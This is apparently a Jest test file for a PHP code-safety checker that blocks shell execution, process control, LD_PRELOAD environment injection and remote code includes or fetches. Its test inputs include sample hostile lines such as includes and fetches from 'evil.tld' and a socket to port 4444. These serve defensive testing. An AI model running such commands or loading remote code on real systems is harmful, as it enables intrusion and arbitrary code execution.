import { assertNoRestrictedPatterns, findRestrictedPatterns } from '../helpers/staticAnalysis';
import { PhpSafeModeViolationError } from '../helpers/errors';

const CLEAN_SNIPPET = `<?php
$data = json_decode(json_encode($n8nInput), true);
$result = ['status' => 'ok', 'input' => $data];
echo json_encode($result);`;

describe('findRestrictedPatterns', () => {
	it('accepts ordinary data-processing code', () => {
		expect(findRestrictedPatterns(CLEAN_SNIPPET)).toEqual([]);
	});

	it.each([
		[`exec('ls -la');`, 'shell execution function (exec)'],
		[`shell_exec('whoami');`, 'shell execution function (shell_exec)'],
		["system('id');", 'shell execution function (system)'],
		[`passthru('uptime');`, 'shell execution function (passthru)'],
		[`popen('ps aux', 'r');`, 'process handle function (popen)'],
		[`proc_open('sh', [], []);`, 'process control function (proc_open)'],
		[`pcntl_exec('/bin/sh');`, 'process control function (pcntl_exec)'],
		[`dl('evil.so');`, 'dynamic extension loader (dl)'],
		[`putenv('LD_PRELOAD=/tmp/evil.so');`, 'environment manipulation (putenv)'],
		[`posix_kill(1);`, 'signal function (posix_kill)'],
		[`proc_nice(-20);`, 'priority function (proc_nice)'],
	])('flags %s', (code, label) => {
		expect(findRestrictedPatterns(`<?php ${code}`)).toContain(label);
	});

	it('flags the backtick shell operator', () => {
		expect(findRestrictedPatterns('<?php $out = `ls`;')).toContain('backtick shell operator');
	});

	it.each([
		`file_get_contents('http://evil.tld/shell.txt');`,
		`file_get_contents("https://evil.tld/shell.txt");`,
		`fopen('ftp://evil.tld/f', 'rb');`,
		`include 'http://evil.tld/impl.php';`,
		`require_once('phar://archive.phar');`,
		`fsockopen('evil.tld', 4444);`,
	])('flags remote code fetch: %s', (code) => {
		expect(findRestrictedPatterns(`<?php ${code}`).length).toBeGreaterThan(0);
	});

	it('does not flag local file access or local includes', () => {
		const code = `<?php
		require_once __DIR__ . '/helpers.php';
		include 'config.php';
		$csv = fopen('/data/input.csv', 'r');
		echo file_get_contents('/etc/hostname');`;

		expect(findRestrictedPatterns(code)).toEqual([]);
	});

	it('does not flag method calls that merely contain a blocked name', () => {
		const code = `<?php
		$client->exec($query);
		Promise::system($x);
		$fn = 'safe';
		$fn();`;

		expect(findRestrictedPatterns(code)).not.toContain('shell execution function (exec)');
		expect(findRestrictedPatterns(code)).not.toContain('shell execution function (system)');
	});
});

describe('assertNoRestrictedPatterns', () => {
	it('passes clean code through silently', () => {
		expect(() => assertNoRestrictedPatterns(CLEAN_SNIPPET)).not.toThrow();
	});

	it('throws PhpSafeModeViolationError aggregating every violation', () => {
		const code = "<?php exec('ls'); shell_exec('id');";

		try {
			assertNoRestrictedPatterns(code);
			throw new Error('expected PhpSafeModeViolationError');
		} catch (error) {
			expect(error).toBeInstanceOf(PhpSafeModeViolationError);
			expect((error as Error).name).toBe('PhpSafeModeViolationError');
			expect((error as Error).message).toContain('shell execution function (exec)');
			expect((error as Error).message).toContain('shell execution function (shell_exec)');
			expect((error as Error).message).toContain('Unrestricted');
		}
	});
});
